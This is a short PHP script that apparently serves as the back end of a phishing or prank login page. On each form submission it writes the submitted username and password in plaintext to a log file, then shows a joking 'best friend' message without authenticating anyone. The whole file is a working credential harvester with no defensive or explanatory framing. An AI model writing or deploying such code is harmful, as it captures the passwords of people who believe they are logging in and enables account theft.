<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    $data = "Username: $user | Password: $pass\n";
    file_put_contents("log.txt", $data, FILE_APPEND);

    echo "<h2>Will You be My Bestesttttttestttt Frienddddddd ??????</h2>";
}
?>
